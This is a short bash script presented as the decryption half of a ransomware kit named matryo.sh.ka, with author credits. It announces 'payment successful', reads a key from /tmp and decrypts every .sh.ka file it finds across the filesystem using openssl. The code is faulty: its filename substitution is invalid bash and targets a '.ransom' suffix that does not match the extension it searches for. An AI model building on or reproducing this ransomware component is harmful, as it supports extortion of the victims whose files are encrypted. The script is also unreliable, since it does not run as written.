#!/bin/bash
# matryo.sh.ka - bash ransomware decryption script
# written by wilsonfisk
# original concept by Captain_Beezay

#decrypt
echo -e "payment successful, decrypting files...";\
key=$(cat /tmp/decryption.key); find / -type f -iname "*.sh.ka" 2>&1|while read -r file;\
do openssl enc -aes256-cbc -d -a -in "$file" -out "$(echo "$file"|${$file//.ransom//})" -pass "env:key";
echo -e "files decrypted.";done
